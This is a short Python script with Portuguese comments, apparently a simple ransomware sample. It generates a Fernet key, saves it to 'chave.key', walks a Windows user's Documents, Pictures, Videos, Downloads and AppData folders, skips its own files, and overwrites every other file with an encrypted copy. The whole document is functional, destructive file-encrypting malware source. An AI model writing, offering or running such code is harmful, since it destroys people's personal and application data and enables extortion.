import os
from cryptography.fernet import Fernet

#chave para criptografar e descriptografar
key = Fernet.generate_key()
with open("chave.key", "wb") as chave:
    chave.write(key)


#arquivos a criptografar

username = os.getenv("USERNAME")
folders = [

    os.path.join(r"C:\Users", username, "Documentos"),
    os.path.join(r"C:\Users", username, "Pictures"),
    os.path.join(r"C:\Users", username, "Videos"),
    os.path.join(r"C:\Users", username, "Downloads"),
    os.path.join(r"C:\Users", username, "AppData", "Local"),
    os.path.join(r"C:\Users", username, "AppData", "Roaming"),

    ]

arquivos = []

for folder in folders:
    for root, dirs, files in os.walk(folder):
        for file in files:

            if file in ["mal.py", "chave.key", "desktop.ini", "malde.py"]:
                continue

            file_path = os.path.join(root,file)
            arquivos.append(file_path)
           
for arquivo in arquivos:
    with open(arquivo, "rb") as file:
        conteudo = file.read()

    conteudo_criptografado = Fernet(key).encrypt(conteudo)

    with open(arquivo, "wb") as file:
        file.write(conteudo_criptografado)
